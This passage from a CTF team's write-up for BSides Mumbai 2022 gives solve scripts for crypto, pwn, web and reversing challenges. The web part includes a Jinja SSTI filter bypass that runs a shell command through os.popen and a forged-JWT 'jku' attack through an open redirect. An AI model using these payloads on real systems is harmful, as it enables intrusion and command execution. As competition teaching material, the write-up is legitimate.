<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">C <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;flag.enc&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>strip()
C <span style="color:#f92672">=</span> [int(char, base<span style="color:#f92672">=</span><span style="color:#ae81ff">16</span>) <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> eval(C)]

<span style="color:#66d9ef">for</span> each <span style="color:#f92672">in</span> C:
    
    p <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff</span>
    a <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc</span>
    b <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b</span>
    
    P<span style="color:#f92672">.&lt;</span>x<span style="color:#f92672">&gt;</span> <span style="color:#f92672">=</span> PolynomialRing(GF(p))
    p <span style="color:#f92672">=</span> x<span style="color:#f92672">^</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> a<span style="color:#f92672">*</span>x <span style="color:#f92672">+</span> b <span style="color:#f92672">-</span> each
    n <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>roots()[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">0</span>]
    
    print(chr(int(hex(n)[<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>:],base<span style="color:#f92672">=</span><span style="color:#ae81ff">16</span>)),end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
</code></pre></div><p>Flag: <code>BSMumbai{Substitution_Cipher_With_Elliptic_Curves?}</code>.</p>
<h3 id="asd-sea">ASD-SEA<a hidden class="anchor" aria-hidden="true" href="#asd-sea">#</a></h3>
<p><em>Solved by Mystiz and fsharp</em></p>
<p>The signing algorithm defined for DSA is insecure, in the sense of the random has only two bytes of unknowns.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sign</span>(msg):
    h <span style="color:#f92672">=</span> SHA<span style="color:#f92672">.</span>new(msg)<span style="color:#f92672">.</span>digest()
    n <span style="color:#f92672">=</span> bytes_to_long(h <span style="color:#f92672">+</span> os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">2</span>))

    <span style="color:#66d9ef">assert</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;</span> n <span style="color:#f92672">&lt;</span> key<span style="color:#f92672">.</span>q<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>

    r <span style="color:#f92672">=</span> pow(key<span style="color:#f92672">.</span>g,n,key<span style="color:#f92672">.</span>p) <span style="color:#f92672">%</span> key<span style="color:#f92672">.</span>q
    s <span style="color:#f92672">=</span> inverse(n, key<span style="color:#f92672">.</span>q)<span style="color:#f92672">*</span>(bytes_to_long(h) <span style="color:#f92672">+</span> key<span style="color:#f92672">.</span>x<span style="color:#f92672">*</span>r) <span style="color:#f92672">%</span> key<span style="color:#f92672">.</span>q
    <span style="color:#66d9ef">return</span> s, r
</code></pre></div><p>In that way, we can brute force for $n$ using $r$ and retrieve the correct $n$. Afterwards, we can use $s$ to obtain the secret key $x$:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> Crypto.Util.Padding <span style="color:#f92672">import</span> pad, unpad
<span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#f92672">from</span> Crypto.PublicKey <span style="color:#f92672">import</span> DSA
<span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
<span style="color:#f92672">from</span> Crypto.Hash <span style="color:#f92672">import</span> SHA

s <span style="color:#f92672">=</span> <span style="color:#ae81ff">14183199055240594428827443533180344323710704440445050743687023631136</span>
r <span style="color:#f92672">=</span> <span style="color:#ae81ff">5334730754297077906351686352081826499252324846119218024815564201902</span>
ct <span style="color:#f92672">=</span> long_to_bytes(<span style="color:#ae81ff">0x5bfb9c359d2986411837be748915ae0f5a4d5646b2740b8c4b712399a984dd60475dc1b72efb703bee0f87c256cde05e</span>)

key <span style="color:#f92672">=</span> DSA<span style="color:#f92672">.</span>import_key(open(<span style="color:#e6db74">&#34;pubkey.pem&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>)<span style="color:#f92672">.</span>read())
m <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;msg.txt&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>)<span style="color:#f92672">.</span>read()
h <span style="color:#f92672">=</span> SHA<span style="color:#f92672">.</span>new(m)<span style="color:#f92672">.</span>digest()

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2</span><span style="color:#f92672">**</span><span style="color:#ae81ff">16</span>):
    n <span style="color:#f92672">=</span> bytes_to_long(h <span style="color:#f92672">+</span> i<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">2</span>, <span style="color:#e6db74">&#34;big&#34;</span>))
    <span style="color:#66d9ef">if</span> pow(key<span style="color:#f92672">.</span>g, n, key<span style="color:#f92672">.</span>p) <span style="color:#f92672">%</span> key<span style="color:#f92672">.</span>q <span style="color:#f92672">==</span> r:
        <span style="color:#66d9ef">break</span>

x <span style="color:#f92672">=</span> ((s <span style="color:#f92672">*</span> n <span style="color:#f92672">-</span> bytes_to_long(h)) <span style="color:#f92672">*</span> inverse(r, key<span style="color:#f92672">.</span>q)) <span style="color:#f92672">%</span> key<span style="color:#f92672">.</span>q
aes_key <span style="color:#f92672">=</span> pad(long_to_bytes(x), <span style="color:#ae81ff">16</span>)
cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(aes_key, AES<span style="color:#f92672">.</span>MODE_ECB)
flag <span style="color:#f92672">=</span> unpad(cipher<span style="color:#f92672">.</span>decrypt(ct), <span style="color:#ae81ff">16</span>)<span style="color:#f92672">.</span>decode()
print(flag) <span style="color:#75715e"># BSMumbai{DSA_msg_related_nonce_problem}</span>
</code></pre></div><h2 id="misc">Misc<a hidden class="anchor" aria-hidden="true" href="#misc">#</a></h2>
<h3 id="boot2root---1">Boot2Root - 1<a hidden class="anchor" aria-hidden="true" href="#boot2root---1">#</a></h3>
<p><em>Solved by Kaiziron</em></p>
<p><a href="https://github.com/Kaiziron/bsides_mumbai_ctf_2022/blob/main/boot2root1.md">https://github.com/Kaiziron/bsides_mumbai_ctf_2022/blob/main/boot2root1.md</a></p>
<h3 id="boot2root---2">Boot2Root - 2<a hidden class="anchor" aria-hidden="true" href="#boot2root---2">#</a></h3>
<p><em>Solved by Kaiziron</em></p>
<p><a href="https://github.com/Kaiziron/bsides_mumbai_ctf_2022/blob/main/boot2root2.md">https://github.com/Kaiziron/bsides_mumbai_ctf_2022/blob/main/boot2root2.md</a></p>
<h2 id="pwn">Pwn<a hidden class="anchor" aria-hidden="true" href="#pwn">#</a></h2>
<h3 id="warmup">warmup<a hidden class="anchor" aria-hidden="true" href="#warmup">#</a></h3>
<p><em>Solved by cire meat pop</em></p>
<p>Obviously, <code>vuln</code> is vulnerable to buffer overflow attack. However, since <code>win</code> function stores the 1st and 2nd arguments on stack and compare if they are equal to some constant, we can&rsquo;t directly call <code>win</code> to get flag. To bypass this, we overwrite the return address of <code>vuln</code> to call <code>win+22</code> such that it only compares the constant with the values on stack which depends on <code>rbp</code>, and the value of <code>rbp</code> can be controlled via buffer overflow attack.</p>
<h4 id="solve">Solve<a hidden class="anchor" aria-hidden="true" href="#solve">#</a></h4>
<ol>
<li>Send random words to get the stack address</li>
<li>Calculate the address for storing user input by minus a fix offset</li>
<li>Crafting the payload: <code>p64(user_input+0x20) + b'\xba\x00\xb0\x00\xbe\xba\xcc\x5e' + b'\x00'*0x10 + p64(user_input) + b'\x8e'</code></li>
<li>Send the payload to trigger buffer overflow</li>
<li>capture flag on screen</li>
</ol>
<h2 id="web">Web<a hidden class="anchor" aria-hidden="true" href="#web">#</a></h2>
<h3 id="useless-forum">Useless Forum<a hidden class="anchor" aria-hidden="true" href="#useless-forum">#</a></h3>
<p><em>Solved by Ja5on</em></p>
<ol>
<li>Found admin user from the 2 initial posts</li>
<li>Saw graphql query, use GraphQLmap to dump schema</li>
<li>there are &ldquo;getUser&rdquo; and &ldquo;getUserV2&rdquo; mutations, the webapp use &ldquo;getUserV2&rdquo; only. Try to use &ldquo;getUser&rdquo; mutation to get Admin info and compare the two responses, identified a hidden post with postID &ldquo;85a270fb-3520-452b-9532-dc198cea99bc&rdquo;</li>
<li>The type comment contain the type post, use mutation &ldquo;makeComment&rdquo; to make comment on the hidden post, and request for the post content to get the flag: <code>{&quot;query&quot;:&quot;mutation{\n  \t\tmakeComment(token:\&quot;TOKEN\&quot;,text:\&quot;abc\&quot;,postID:\&quot;85a270fb-3520-452b-9532-dc198cea99bc\&quot;){\n  \t\t\tcommentID\n text\npost{content}\n \t\t\t}\n\t\t}&quot;}</code></li>
</ol>
<h3 id="complaint-box">Complaint Box<a hidden class="anchor" aria-hidden="true" href="#complaint-box">#</a></h3>
<p><em>Solved by Ja5on</em></p>
<ol>
<li>random fill in the form, got error message &ldquo;Does email really need those?, anyway here are the blaclisted keywords ['{{', &lsquo;}}&rsquo;, &lsquo;.&rsquo;, &lsquo;_&rsquo;, &lsquo;0&rsquo;, &lsquo;1&rsquo;, &lsquo;2&rsquo;, &lsquo;3&rsquo;, &lsquo;4&rsquo;, &lsquo;5&rsquo;, &lsquo;6&rsquo;, &lsquo;7&rsquo;, &lsquo;8&rsquo;, &lsquo;9&rsquo;]&rdquo;</li>
<li>python server + blacklisted keywords &lsquo;{{&rsquo;, &lsquo;}}&rsquo; -&gt; SSTI in email field</li>
<li>use {% %} bypass the &lsquo;{{&rsquo;, &lsquo;}}&rsquo; filter, payload <code>{% print(config) %}</code> work</li>
<li>use |attr to bypass &ldquo;.&rdquo;, use request.values for string subsitution. Final payload : <code>name=ab&amp;xx=__class__&amp;xy=__base__&amp;xz=__subclasses__&amp;yy=__getitem__&amp;yz=84&amp;zz=load_module&amp;email={%set+a=request[&quot;values&quot;][&quot;xx&quot;]%}{%set+b=request[&quot;values&quot;][&quot;xy&quot;]%}{%set+c=request[&quot;values&quot;][&quot;xz&quot;]%}{%set+d=request[&quot;values&quot;][&quot;yy&quot;]%}{%set+e=request[&quot;values&quot;][&quot;yz&quot;]%}{%set+f=request[&quot;values&quot;][&quot;zz&quot;]%}{%print([]|attr(a)|attr(b)|attr(c)()|attr(d)(e|int)|attr(f)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat+flag*&quot;)|attr(&quot;read&quot;)())%}&amp;subject=ab&amp;message=ab</code></li>
</ol>
<h3 id="bongo-cat">Bongo Cat<a hidden class="anchor" aria-hidden="true" href="#bongo-cat">#</a></h3>
<p><em>Solved by Hollow</em></p>
<ol>
<li>Check cookie, find JWT.</li>
<li>Seeing &ldquo;jku&rdquo; in header -&gt; You can specify the issuer yourself.</li>
<li>Noting that the issuer must be from the same host, look for open redirect in the website.</li>
<li>There is a endpoint <code>/?redirect_uri=/dashbord</code>. Asserting that it can redirect to external resources.</li>
<li>Craft RSA keypair with <code>openssl genrsa -out priv.pem 2048</code> and <code>openssl rsa -pubout -in priv.pem -out pub.pem</code></li>
<li>Dump <code>n</code> and <code>e</code> from the private key with RsaCtfTool <code>python3 RsaCtfTool.py --key priv.pem --dump</code></li>
<li>Convert <code>n</code> and <code>e</code> into base64-encoded standard with the following code: (Credit: <em>Mystiz</em>)</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> base64
n <span style="color:#f92672">=</span> 
e <span style="color:#f92672">=</span> 
n <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>to_bytes(n, (n<span style="color:#f92672">.</span>bit_length()<span style="color:#f92672">+</span><span style="color:#ae81ff">7</span>)<span style="color:#f92672">//</span><span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;big&#39;</span>)
e <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>to_bytes(e, (e<span style="color:#f92672">.</span>bit_length()<span style="color:#f92672">+</span><span style="color:#ae81ff">7</span>)<span style="color:#f92672">//</span><span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;big&#39;</span>)
print(base64<span style="color:#f92672">.</span>urlsafe_b64encode(n))
print(base64<span style="color:#f92672">.</span>urlsafe_b64encode(e))
</code></pre></div><ol start="8">
<li>Create a file named <code>jwks.json</code> and host it on your server.</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{<span style="color:#f92672">&#34;kty&#34;</span>:<span style="color:#e6db74">&#34;RSA&#34;</span>,<span style="color:#f92672">&#34;e&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;use&#34;</span>:<span style="color:#e6db74">&#34;sig&#34;</span>,<span style="color:#f92672">&#34;alg&#34;</span>:<span style="color:#e6db74">&#34;RS256&#34;</span>,<span style="color:#f92672">&#34;n&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>}
</code></pre></div><ol start="9">
<li>Sign the JWT with data <code>{&quot;user&quot;:&quot;admin&quot;}</code> and submit the cookie.</li>
</ol>
<pre tabindex="0"><code class="language-python!" data-lang="python!">import jwt
import requests

private_key = open(&quot;priv.pem&quot;).read().strip()
public_key = open(&quot;pub.pem&quot;).read().strip()

encoded = jwt.encode({&quot;user&quot;:&quot;admin&quot;},private_key,algorithm=&quot;RS256&quot;,
    headers={&quot;alg&quot;:&quot;RS256&quot;,&quot;typ&quot;:&quot;JWT&quot;,&quot;jku&quot;:&quot;http://34.133.45.223/?redirect_uri=https://asdfasdf/jwks.json&quot;
    })

r = requests.get(&quot;http://34.133.45.223/dashboard&quot;, headers={&quot;Cookie&quot;:f&quot;token={encoded}&quot;})

print(r.text)
</code></pre><p>P.S. Thanks for the work that <em>Mystiz</em> has checked that <code>n</code> is secure and is not vulnerable to common factorization attacks.</p>
<h2 id="reverse">Reverse<a hidden class="anchor" aria-hidden="true" href="#reverse">#</a></h2>
<h3 id="warmup-1">Warmup<a hidden class="anchor" aria-hidden="true" href="#warmup-1">#</a></h3>
<p><em>Solved by fsharp</em></p>
<p>The file is the emitted LLVM IR of a C program for checking a password. The program could be summarized as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
{
    <span style="color:#66d9ef">char</span> password[<span style="color:#ae81ff">100</span>];
    
    printf(<span style="color:#e6db74">&#34;Enter a string: &#34;</span>);
    scanf(<span style="color:#e6db74">&#34;%s&#34;</span>, <span style="color:#f92672">&amp;</span>password);
    
    <span style="color:#66d9ef">if</span> (strlen(password) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">39</span>)
        exit(<span style="color:#ae81ff">0</span>);
    
    <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)password[<span style="color:#ae81ff">28</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">55</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#66d9ef">int</span>)password[<span style="color:#ae81ff">30</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">110</span> <span style="color:#f92672">&amp;&amp;</span> ... <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#66d9ef">int</span>)password[<span style="color:#ae81ff">20</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">110</span>)
        printf(<span style="color:#e6db74">&#34;The flag is correct!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    <span style="color:#66d9ef">else</span>
        printf(<span style="color:#e6db74">&#34;The flag is incorrect.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>Save every line from the start of label 10 (<code>10: ... ; preds = %0</code>) to the blank line after the end of label 200 into a file called <code>lines.txt</code>. Then, run the following script to construct the flag:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;lines.txt&#34;</span>, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
    lines <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>splitlines()

flag_tuples <span style="color:#f92672">=</span> []

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(lines), <span style="color:#ae81ff">7</span>):
    second_line <span style="color:#f92672">=</span> lines[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>]
    chr_pos <span style="color:#f92672">=</span> int(second_line[second_line<span style="color:#f92672">.</span>rindex(<span style="color:#e6db74">&#39; &#39;</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>:])
    fifth_line <span style="color:#f92672">=</span> lines[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>]
    chr_val <span style="color:#f92672">=</span> int(fifth_line[fifth_line<span style="color:#f92672">.</span>rindex(<span style="color:#e6db74">&#39; &#39;</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>:])
    flag_tuples<span style="color:#f92672">.</span>append((chr_pos, chr_val))

flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
<span style="color:#66d9ef">for</span> (pos, val) <span style="color:#f92672">in</span> sorted(flag_tuples):
    flag <span style="color:#f92672">+=</span> chr(val)

print(flag)
</code></pre></div><p>The flag is <code>BSM{1_f0und_my531f_1n_4_f10471n9_h0u53}</code>.</p>
<h3 id="onionkopon">onionkopon<a hidden class="anchor" aria-hidden="true" href="#onionkopon">#</a></h3>
<p><em>Solved by Mystiz and fsharp</em></p>
<p>We have a small C program that checks if the password length is a multiple of 8, then encodes each 8-byte block of the password. If these blocks all match 40 given bytes, the password&rsquo;s correct.</p>
<p>The program logic is summarized as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rol</span>(u, n):
    <span style="color:#66d9ef">return</span> ((u<span style="color:#f92672">&lt;&lt;</span>n) <span style="color:#f92672">|</span> (u<span style="color:#f92672">&gt;&gt;</span>(<span style="color:#ae81ff">16</span><span style="color:#f92672">-</span>n))) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffff</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">process_block</span>(pw_block):
    pw <span style="color:#f92672">=</span> [int<span style="color:#f92672">.</span>from_bytes(pw_block[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#39;little&#39;</span>) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">2</span>)]
    xor_buffer <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0xDEAD</span>, <span style="color:#ae81ff">0xBEEF</span>, <span style="color:#ae81ff">0xCAFE</span>, <span style="color:#ae81ff">0xBABE</span>]
    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
            pw[(i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> ((pw[i] <span style="color:#f92672">^</span> xor_buffer[i]) <span style="color:#f92672">+</span> pw[(i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span>]) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffff</span>
            pw[(i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> rol(pw[(i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span>], <span style="color:#ae81ff">12</span>)

    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([int<span style="color:#f92672">.</span>to_bytes(p, <span style="color:#ae81ff">2</span>, <span style="color:#e6db74">&#39;little&#39;</span>) <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> pw])

correct_pw <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;...&#34;</span>
encoded <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>

<span style="color:#66d9ef">assert</span> len(correct_pw) <span style="color:#f92672">%</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">8</span>):
    encoded <span style="color:#f92672">+=</span> process_block(correct_pw[i : i <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>])

<span style="color:#66d9ef">assert</span> encoded <span style="color:#f92672">==</span> bytes<span style="color:#f92672">.</span>fromhex(<span style="color:#e6db74">&#34;100baacdddd46faa1c0fe0abcbf8fc45e607ac4bedcd1cef29c73102bb971afd6a34a94c7a90ab5c&#34;</span>)
</code></pre></div><p>We write a function to invert the operations done onto each encoded block to find the flag:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rol</span>(u, n):
    <span style="color:#66d9ef">return</span> ((u<span style="color:#f92672">&lt;&lt;</span>n) <span style="color:#f92672">|</span> (u<span style="color:#f92672">&gt;&gt;</span>(<span style="color:#ae81ff">16</span><span style="color:#f92672">-</span>n))) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffff</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">inverse_process_block</span>(pw_block):
    pw <span style="color:#f92672">=</span> [int<span style="color:#f92672">.</span>from_bytes(pw_block[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#39;little&#39;</span>) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">2</span>)]
    xor_buffer <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0xDEAD</span>, <span style="color:#ae81ff">0xBEEF</span>, <span style="color:#ae81ff">0xCAFE</span>, <span style="color:#ae81ff">0xBABE</span>]
    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> [<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>]:
            pw[(i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> rol(pw[(i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span>], <span style="color:#ae81ff">4</span>)
            pw[(i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> (pw[(i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span>] <span style="color:#f92672">-</span> (pw[i] <span style="color:#f92672">^</span> xor_buffer[i])) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffff</span>
    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([int<span style="color:#f92672">.</span>to_bytes(p, <span style="color:#ae81ff">2</span>, <span style="color:#e6db74">&#39;little&#39;</span>) <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> pw])<span style="color:#f92672">.</span>decode()

encoded <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(<span style="color:#e6db74">&#34;100baacdddd46faa1c0fe0abcbf8fc45e607ac4bedcd1cef29c73102bb971afd6a34a94c7a90ab5c&#34;</span>)
flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(encoded), <span style="color:#ae81ff">8</span>):
    flag <span style="color:#f92672">+=</span> inverse_process_block(encoded[i : i <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>])

print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;BSM</span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">{</span>flag<span style="color:#e6db74">}</span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">&#34;</span>)
</code></pre></div><p>The flag is <code>BSM{__4dv32517y_15_7h3_f1257_p47h_70_72u7h__}</code>.</p>
<h3 id="the-last-one">The Last One<a hidden class="anchor" aria-hidden="true" href="#the-last-one">#</a></h3>
<p><em>Solved by TWY, grhkm and fsharp</em></p>
<p>The file is a PYC file from Python 3.11. To the best of our knowledge, the current programs that offer functionality for disassembling PYC files or turning them into an equivalent Python script (e.g. <code>decompyle3</code>, <code>uncompyle6</code>, <code>pycdc</code>, <code>pydumpck</code>) do not yet support this version of Python, which was only released around 45 days before the CTF started. So, we instead chose to disassemble the file using Python 3.11.0 directly:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> marshal<span style="color:#f92672">,</span> dis

f <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;rev5&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>)
_ <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>seek(<span style="color:#ae81ff">16</span>)
code <span style="color:#f92672">=</span> marshal<span style="color:#f92672">.</span>load(f)
f<span style="color:#f92672">.</span>close()

print(dis<span style="color:#f92672">.</span>dis(code))
print(dis<span style="color:#f92672">.</span>show_code(code))
</code></pre></div><p>After reading through the disassembly, the program logic is basically:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sys

ror <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> val, r_bits, max_bits: ((val <span style="color:#f92672">&amp;</span> (<span style="color:#ae81ff">2</span> <span style="color:#f92672">**</span> max_bits <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)) <span style="color:#f92672">&gt;&gt;</span> (r_bits <span style="color:#f92672">%</span> max_bits)) <span style="color:#f92672">|</span> ((val <span style="color:#f92672">&lt;&lt;</span> (max_bits <span style="color:#f92672">-</span> (r_bits <span style="color:#f92672">%</span> max_bits)) <span style="color:#f92672">&amp;</span> (<span style="color:#ae81ff">2</span> <span style="color:#f92672">**</span> max_bits <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)))
